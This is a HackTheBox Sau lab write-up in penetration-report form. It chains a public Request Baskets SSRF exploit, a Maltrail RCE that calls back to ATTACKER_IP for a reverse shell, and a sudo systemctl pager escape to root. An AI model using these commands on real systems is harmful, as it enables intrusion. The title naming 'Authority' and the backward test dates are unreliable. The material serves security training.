# HTB Authority - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-7

---

## 0. Lesson Learned

When an exploit should run but it doesn't, double check for typos. A `/` in place of a `:` can ruin everything.

---

## 1. Executive Summary

A penetration test was conducted against the Sau target system. The assessment identified multiple critical misconfigurations including Server Side Request Forgery (SSRF), Remote Code Execution (RCE), and insecure sudo configuration.

Initial access was achieved through SSRF forwarding to a filtered port. Further exploitation of a RCE vulnerability resulted in a low-level unprivileged shell. Finally, privilege escalation to root was achieved through abuse of insecure sudo configuration.

The system was fully compromised.

---

## 2. Scope

- **Target:** 10.129.229.26
- **Environment:** HackTheBox Sau (Retired Machine)
- **Testing Window:** 2026-4-5 to 2025-4-7
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

```
nmap -p- -sCV 10.129.229.26 -T4 -oA sau_tcp
```

Open services:

- 22/tcp - OpenSSH 8.2p1 Ubuntu
- 80/tcp - http - filtered
- 8338/tcp - unknown - filtered
- 55555/tcp - http - Golang net/http server

Port 55555 was considered for further enumeration based on potential attack surface.

---

## 5. Enumeration

The target IP address was appended to hosts file:

```
echo "10.129.229.26  sau.htb" >> /etc/hosts
```

Manual inspection of port 55555 with redirect to `/web` revealed a HTTP Requests Basket website:

```
http://sau.htb:55555/web
```

A public exploit was found to redirect requests to another target with Server Side Request Forgery (SSRF). This exploit was used to redirect requests from open port 55555 to filtered port 80:

```
python3 exploit.py "http://sau.htb:55555" "http://sau.htb"
```

Successful exploitation returned:

```
Any request sent to http://sau.htb:55555/mbejjt will now be forwarded to the service on http://sau.htb.
```

Investigating the forwarded request revealed a Maltrail v0.53 website.

---

## 6. Initial Access

A public exploit for Maltrail v0.53 was located to gain a initial shell.

A listener was started on the attacker machine:

```
nc -lnvp 443
```

And the exploit was run:

```
python3 exploit.py ATTACKER_IP 443 http://sau.htb:55555/mbejjt
```

This resulted in an unprivileged shell as user `puma` on host `sau`.

---

## 7. Post-Exploitation

Manual enumeration revealed sudo permissions for `puma`:

```
sudo -l
```

This indicated user `puma` can run the command `/usr/bin/systemctl status trail.service` without a password. The `systemctl` executable can inherit from `less` allowing for privilege escalation.

---

## 8. Privilege Escalation

The `systemctl` command run with sudo permissions resulted in a Maltrail Server of malicious traffic detection system running on a pager program:

```
sudo /usr/bin/systemctl status trail.service
```

The inherited vulnerability of `less` was exploited in the pager:

```
!/bin/sh
```

Resulting in a root shell.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /home/puma/user.txt
```

**Root Flag**: *REDACTED*

```
cat /root/root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Vulnerable Web Application Allowing Remote Code Execution

**Severity:** Critical

**Description:**
A publicly accessible web application contained a known vulnerability that allowed arbitrary command execution.

**Impact:**
Unauthenticated attackers could gain system-level access to the host.

**Recommendation:**
Remove or upgrade the vulnerable application, restrict administrative interfaces, and isolate legacy services.

### **Finding:** Insecure Sudo Configuration Allowing Shell Escape via Binary

**Severity:** Critical

**Description:**
A user was permitted to execute a binary via sudo that allowed shell escape or arbitrary command execution.

**Impact:**
Attackers could exploit the binary to execute commands as root and fully compromise the system.

**Recommendation:**
Avoid granting sudo access to binaries capable of shell execution, restrict sudo permissions to required commands only, and enforce least-privilege policies.

---

## 11. Appendix

Request Baskets (1.2.1) SSRF Exploit - 
[https://github.com/Khalidhaimur/exploit-request-baskets-1.2.1](https://github.com/Khalidhaimur/exploit-request-baskets-1.2.1)

Maltrail v0.53 RCE Exploit - 
[https://github.com/spookier/Maltrail-v0.53-Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit)